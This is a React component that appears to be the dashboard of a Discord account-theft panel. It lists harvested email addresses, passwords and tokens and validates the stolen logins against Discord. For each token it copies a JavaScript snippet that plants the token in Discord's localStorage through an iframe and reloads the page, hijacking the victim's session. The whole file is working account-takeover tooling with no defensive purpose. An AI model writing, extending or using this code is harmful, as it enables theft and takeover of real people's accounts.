import "./Database.scss";
import React, { useEffect, useState } from "react";
import { discordService } from "../../services/discord.service";
import { FaRegQuestionCircle } from "react-icons/fa";
import { MdOutlineErrorOutline, MdDone } from "react-icons/md";
import { CopyToClipboard } from "react-copy-to-clipboard";
import { text } from "body-parser";

const Database = (props) => {
    const [database, setDatabase] = useState();
    const [error, setError] = useState([]);
    const [checked, setChecked] = useState([]);

    const check = async (login, pass) => {
        const res = await discordService.connectToDiscord({ login, pass });

        if (!res.data.success) {
            const errors = [...error];

            if (errors.includes(login)) return;

            errors.push(login);
            setError(errors);
        } else {
            const checked_ = [...checked];

            if (checked_.includes(login)) return;

            checked_.push(login);
            setChecked(checked_);
        }
    };

    const createText = (token) => {
        const text = [];
        text.push(`let token = "${token}"`);
        text.push(`function login(token) {`);
        text.push(`    setInterval(() => {`);
        text.push(
            '      document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`'
        );
        text.push(`    }, 50);`);
        text.push(`    setTimeout(() => {`);
        text.push(`      location.reload();`);
        text.push(`    }, 2500);`);
        text.push(`  }`);
        text.push(`login(token);`);
        return text.join("\n");
    };

    useEffect(async () => {
        const res = await discordService.getDatabase();
        setDatabase(res.data.database);
    }, []);

    return (
        <div className="database_page">
            <table className="table">
                <tr className="top_bar">
                    <th className="email">Email address</th>
                    <th className="pass">Password</th>
                    <th className="token">Token</th>
                    <th>STATUS</th>
                    <th></th>
                </tr>
                {database &&
                    database.map((e) => {
                        return (
                            <tr
                                className={
                                    error.includes(e.login) ? `not_found` : ""
                                }
                            >
                                <td>{e.login}</td>
                                <td>{e.password}</td>
                                <td style={{ cursor: "pointer" }}>
                                    <CopyToClipboard text={createText(e.token)}>
                                        <a
                                            target="_blank"
                                            href="https://discord.com/login"
                                            rel="noopener noreferrer"
                                        >
                                            {e.token}
                                        </a>
                                    </CopyToClipboard>
                                </td>
                                <td className="status">
                                    <p>
                                        {error.includes(e.login) ? (
                                            <MdOutlineErrorOutline
                                                color="#eb4034"
                                                size={20}
                                            />
                                        ) : checked.includes(e.login) ? (
                                            <MdDone color="#32a852" size={20} />
                                        ) : (
                                            <FaRegQuestionCircle
                                                color="#3269a8"
                                                size={20}
                                            />
                                        )}
                                    </p>
                                </td>
                                <td className="button">
                                    <p
                                        onClick={() =>
                                            check(e.login, e.password)
                                        }
                                    >
                                        CHECK
                                    </p>
                                </td>
                            </tr>
                        );
                    })}
            </table>
        </div>
    );
};

export default Database;
